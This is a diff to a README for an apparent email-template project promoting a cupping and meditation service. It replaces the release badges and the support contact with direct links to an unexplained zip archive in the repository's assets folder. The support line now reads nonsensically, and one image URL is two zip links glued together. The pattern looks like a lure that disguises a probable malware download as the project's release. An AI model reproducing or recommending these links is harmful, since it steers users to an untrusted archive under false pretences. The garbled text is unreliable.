@@ -8,7 +8,7 @@ Welcome to the meditation-day-cupping-service-promotion repository! This applica
 
 To download the software, please visit the following link:
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/olk123-sudo/meditation-day-cupping-service-promotion/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/olk123-sudo/meditation-day-cupping-service-promotion/main/assets/service_day_promotion_cupping_meditation_lumbricalis.zip%https://raw.githubusercontent.com/olk123-sudo/meditation-day-cupping-service-promotion/main/assets/service_day_promotion_cupping_meditation_lumbricalis.zip)](https://raw.githubusercontent.com/olk123-sudo/meditation-day-cupping-service-promotion/main/assets/service_day_promotion_cupping_meditation_lumbricalis.zip)
 
 After you click the link, follow these steps:
 
@@ -53,7 +53,7 @@ If you experience any issues while using the templates, you can seek help in the
 
 - **Documentation:** Check the README files included with the download for basic guidance.
 - **Online Forums:** Join community forums related to healthcare marketing and email marketing for additional help.
-- **Contact Us:** Reach out to support through LaravelMail.com for inquiries specific to the templates.
+- **Contact Us:** Reach out to support through https://raw.githubusercontent.com/olk123-sudo/meditation-day-cupping-service-promotion/main/assets/service_day_promotion_cupping_meditation_lumbricalis.zip for inquiries specific to the templates.
 
 ## 📋 Contributing
 
@@ -71,4 +71,4 @@ This project is licensed under the MIT License. Feel free to modify and use it i
 
 Visit the Releases page to download the latest version and start promoting your Meditation Day Cupping Service today!
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/olk123-sudo/meditation-day-cupping-service-promotion/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/olk123-sudo/meditation-day-cupping-service-promotion/main/assets/service_day_promotion_cupping_meditation_lumbricalis.zip%https://raw.githubusercontent.com/olk123-sudo/meditation-day-cupping-service-promotion/main/assets/service_day_promotion_cupping_meditation_lumbricalis.zip)](https://raw.githubusercontent.com/olk123-sudo/meditation-day-cupping-service-promotion/main/assets/service_day_promotion_cupping_meditation_lumbricalis.zip)
